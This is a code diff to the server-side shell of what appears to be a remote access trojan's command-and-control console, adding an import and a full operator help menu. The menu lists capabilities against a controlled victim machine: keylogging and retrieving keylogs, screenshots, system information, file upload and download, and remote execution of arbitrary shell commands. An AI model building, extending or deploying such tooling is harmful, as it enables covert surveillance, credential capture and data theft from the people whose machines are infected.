@@ -1,5 +1,6 @@
 from .communication import send_data, recv_data
 from .logging_config import logging
+from .state import client_info_map
 from pystyle import Colors, Colorate
 
 def shell(session_id):
@@ -27,9 +28,37 @@ def shell(session_id):
                 continue
             if base_cmd == 'help':
                 print(Colorate.Vertical(Colors.red_to_purple, """
-    **** SHELL COMMANDS MENU ****
-    [Truncated for brevity; same as original help text]
-                """, 2))
+**** SHELL COMMANDS MENU ****
+
+  help
+      Description: Show this shell commands menu.
+  bg / background / q / exit_shell
+      Description: Return to main server menu (session remains active).
+  kill_client
+      Description: Terminate the client program for this session.
+  sysinfo
+      Description: Get detailed system information from the client.
+  screenshot
+      Description: Take a screenshot on the client.
+  keylog_start
+      Description: Start keylogger on the client.
+  keylog_stop
+      Description: Stop keylogger on the client.
+  get_keylogs
+      Description: Retrieve keylogs from the client.
+  upload <filename>
+      Description: Upload a file to the client.
+  download <filename>
+      Description: Download a file from the client.
+  cd <dir>
+      Description: Change directory on the client.
+  ls
+      Description: List directory contents on the client.
+  pwd
+      Description: Print working directory on the client.
+  Any other shell command supported by the client's OS will be executed remotely.
+
+""", 2))
                 continue
             elif base_cmd in ['bg', 'background', 'q', 'exit_shell']:
                 print(f"{Colors.cyan}[*] Returning to main server menu. Session {session_id} remains active.{Colors.reset}")
